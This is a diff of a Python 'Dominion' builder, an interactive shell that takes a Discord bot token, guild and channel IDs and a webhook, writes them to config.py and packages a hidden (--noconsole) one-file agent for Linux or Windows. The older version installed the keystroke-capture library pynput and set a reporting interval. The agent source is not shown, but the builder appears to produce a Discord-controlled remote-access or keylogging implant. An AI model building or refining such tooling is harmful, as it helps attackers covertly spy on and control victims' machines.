@@ -1,115 +1,175 @@
 #!/usr/bin/env python3
 
-import os
-import sys
 import subprocess
-import argparse
+import os
 from shutil import which
+from colorama import Fore, init
+
+
+class DominionBuilder:
+    def __init__(self):
+        self.config = {
+            "guild-id": "",
+            "bot-token": "",
+            "channel-id": "",
+            "webhook": ""
+        }
+        self.commands = {
+            "set": self.set_option,
+            "build": self.build,
+            "help": self.print_help,
+            "exit": self.exit_builder,
+            "show": self.show_options
+        }
 
 
 
-def check_installed(program):
-    return which(program) is not None
+    def print_banner(self):
+        """Prints the ASCII art banner."""
+        banner = r"""
+                                                                                
+ ▄▄▄▄▄                            ██                  ██                        
+ ██▀▀▀██                          ▀▀                  ▀▀                        
+ ██    ██   ▄████▄   ████▄██▄   ████     ██▄████▄   ████      ▄████▄   ██▄████▄ 
+ ██    ██  ██▀  ▀██  ██ ██ ██     ██     ██▀   ██     ██     ██▀  ▀██  ██▀   ██ 
+ ██    ██  ██    ██  ██ ██ ██     ██     ██    ██     ██     ██    ██  ██    ██ 
+ ██▄▄▄██   ▀██▄▄██▀  ██ ██ ██  ▄▄▄██▄▄▄  ██    ██  ▄▄▄██▄▄▄  ▀██▄▄██▀  ██    ██ 
+ ▀▀▀▀▀       ▀▀▀▀    ▀▀ ▀▀ ▀▀  ▀▀▀▀▀▀▀▀  ▀▀    ▀▀  ▀▀▀▀▀▀▀▀    ▀▀▀▀    ▀▀    ▀▀ 
+                                                                                
+                                                                                
+        """
+        print(banner)
 
-def install_linux_pyinstaller():
-    print("[+] Installing PyInstaller + requirements for Linux...")
-    subprocess.run(["sudo", "apt", "update"])
-    subprocess.run(["sudo", "apt", "install", "-y", "python3-pip"])
-    subprocess.run(["pip3", "install", "--upgrade", "pip"])
-    subprocess.run(["pip3", "install", "pyinstaller", "pynput", "thread6", "requests"])
+    def print_help(self, *args):
+        """Prints the help message."""
+        print("\nCommands:")
+        print("  set <option> <value>  - Set a configuration option.")
+        print("  show                  - Show the current configuration.")
+        print("  build <os>            - Build the Dominion agent for 'linux' or 'windows'.")
+        print("  help                  - Show this help message.")
+        print("  exit                  - Exit the builder.")
+        print("\nOptions:")
+        for option in self.config:
+            print(f"  {option}")
+        print()
 
+    def show_options(self, *args):
+        """Shows the current configuration."""
+        print("\nCurrent Configuration:")
+        for option, value in self.config.items():
+            display_value = value if value else "Not Set"
+            print(f"  {option}: {display_value}")
+        print()
 
-
-def find_wine_python311():
-    possible_paths = [
-        "C:\\Python311\\python.exe",
-        "C:\\Users\\root\\AppData\\Local\\Programs\\Python\\Python311\\python.exe",
-        "C:\\Program Files\\Python311\\python.exe",
-        "C:\\Program Files (x86)\\Python311\\python.exe"
-    ]
-    for path in possible_paths:
-        result = subprocess.run(["wine", path, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        if result.returncode == 0:
-            return path
-    return None
-
-
-
-def main():
-    parser = argparse.ArgumentParser(description="Dominion Setup")
-    parser.add_argument("--webhook", required=True, help="Discord webhook URL")
-    parser.add_argument("--interval", required=False, type=int, default=60, help="Reporting interval (sec)")
-    parser.add_argument("--windows", action="store_true", help="Build Windows EXE with Wine Python 3.11")
-    parser.add_argument("--linux", action="store_true", help="Build Linux binary")
-
-    args = parser.parse_args()
-
-    with open("config.py", "w") as f:
-        f.write(f'WEBHOOK_URL = "{args.webhook}"\n')
-        f.write(f'INTERVAL = {args.interval}\n')
-
-    print(f"[+] Saved config: webhook + interval {args.interval} sec")
-
-    if not args.windows and not args.linux:
-        print("[-] Please specify --windows or --linux")
-        sys.exit(1)
-
-
-
-    if args.windows:
-        print("[+] Target: Windows")
-
-        if not check_installed("wine"):
-            print("[-] Wine is not installed. Please install it first.")
-            sys.exit(1)
-
-        python_installed = False
-
-        while not python_installed:
-            wine_python = find_wine_python311()
-
-            if wine_python:
-                print(f"[+] Found Python in Wine: {wine_python}")
-                python_installed = True
+    def set_option(self, *args):
+        """Sets a configuration option."""
+        if len(args) >= 2:
+            option, value = args[0], " ".join(args[1:])
+            if option in self.config:
+                self.config[option] = value
+                print(f"[+] {option} => {value}")
+                if option == "bot-token":
+                    print("[!] INFO: Ensure this is a valid bot token from your Discord Developer Portal application.")
             else:
-                print("[!] Python 3.11 not found inside Wine.")
-                if os.path.exists("python311.exe"):
-                    print("[+] Found local python311.exe, using it.")
-                else:
-                    print("[+] Downloading Python 3.11 installer...")
-                    subprocess.run(["wget", "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe", "-O", "python311.exe"])
-
-                print("[+] Starting Python installer inside Wine...")
-                subprocess.Popen(["wine", "python311.exe"]).wait()
-                input("[!] Please complete the installer wizard fully, then press Enter to re-check...")
-
-
-        
-        print("[+] Checking & Installing required Python packages...")
-        subprocess.run(['wine', wine_python, "-m", "pip", "install", "--upgrade", "pip"])
-        subprocess.run(['wine', wine_python, "-m", "pip", "install", "pyinstaller", "pynput", "thread6", "requests"])
-
-        print("[+] Building Windows EXE...")
-        subprocess.run(["wine", wine_python, "-m", "PyInstaller", "--onefile", "--clean", "--noconsole", "start.py"])
-
-
-
-
-    if args.linux:
-        print("[+] Target: Linux")
-
-        if not check_installed("pyinstaller"):
-            print("[-] PyInstaller not found. Installing now...")
-            install_linux_pyinstaller()
+                print(f"[-] Invalid option: {option}")
         else:
-            subprocess.run(["pip3", "install", "pynput", "thread6", "requests", "--break-system-packages"])
+            print("[-] Usage: set <option> <value>")
 
-        print("[+] Building Linux binary...")
-        subprocess.run(["pyinstaller", "--onefile", "start.py"])
+    def _check_deps(self, target_os):
+        """Checks for necessary build dependencies."""
+        if not which("pyinstaller"):
+            print("[-] PyInstaller not found. Please run install.sh as root.")
+            return False
+        if target_os == "windows" and not which("wine"):
+            print("[-] Wine not found. Please install it to build for Windows (e.g., 'sudo apt install wine').")
+            return False
+        return True
 
-    print("[+] All done! Check /dist/ for your output.")
+    def build(self, *args):
+        """Builds the Dominion agent for a specific OS."""
+        if not args:
+            print("[-] Usage: build <os> (e.g., build linux)")
+            return
+
+        target_os = args[0].lower()
+        if target_os not in ["linux", "windows"]:
+            print(f"[-] Invalid build target: {target_os}. Use 'linux' or 'windows'.")
+            return
+
+        if not self._check_deps(target_os):
+            return
+
+        print(f"[+] Starting build for {target_os}...")
+
+        for option, value in self.config.items():
+            if not value:
+                print(f"[-] Please set the '{option}' before building.")
+                return
+
+        with open("config.py", "w") as f:
+            f.write(f'GUILD_ID = "{self.config["guild-id"]}"\n')
+            f.write(f'BOT_TOKEN = "{self.config["bot-token"]}"\n')
+            f.write(f'CHANNEL_ID = "{self.config["channel-id"]}"\n')
+            f.write(f'WEBHOOK_URL = "{self.config["webhook"]}"\n')
+            f.write('COMMAND_PREFIX = "!"\n')
+
+        print("[+] Configuration saved to config.py")
+
+        build_command = [
+            "pyinstaller", "--onefile", "--noconsole", "--clean",
+            "--name", f"dominion-{target_os}", "start.py"
+        ]
+
+        if target_os == "windows":
+            # For Windows, we need to use wine and a windows version of python/pyinstaller
+            # This is a simplified approach. A more robust solution would use a dedicated wine prefix.
+            print("[!] Windows builds on Linux can be complex. This is a best-effort attempt.")
+            print("[!] Make sure you have a Python installation inside your Wine environment.")
+            build_command.insert(0, "wine")
+            # The command needs to point to the pyinstaller.exe inside wine
+            # This is a common path, but may vary
+            build_command[1] = os.path.expanduser("~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python311/Scripts/pyinstaller.exe")
 
 
+        try:
+            print(f"[+] Running command: {" ".join(build_command)}")
+            subprocess.run(build_command, check=True)
+            print(f"[+] Build successful! Check the 'dist' directory for the executable.")
+        except subprocess.CalledProcessError as e:
+            print(f"[-] Build failed: {e}")
+            if target_os == "windows":
+                print("[-] Windows build may have failed due to missing Python/PyInstaller in the Wine environment.")
+        except FileNotFoundError:
+            print(f"[-] Command not found. Ensure {" and ".join(build_command)} is in your PATH.")
+
+
+    def exit_builder(self, *args):
+        """Exits the builder."""
+        print("Exiting Dominion builder.")
+        exit(0)
+
+    def run(self):
+        """Runs the builder's interactive shell."""
+        self.print_banner()
+        self.print_help()
+        while True:
+            try:
+                prompt = "Dominion > "
+                user_input = input(prompt).strip().split()
+                if user_input:
+                    command = user_input[0].lower()
+                    args = user_input[1:]
+                    if command in self.commands:
+                        self.commands[command](*args)
+                    else:
+                        print(f"[-] Unknown command: {command}")
+            except KeyboardInterrupt:
+                print()
+                self.exit_builder()
+            except EOFError:
+                print()
+                self.exit_builder()
 
 if __name__ == "__main__":
-    main()
+    builder = DominionBuilder()
+    builder.run()
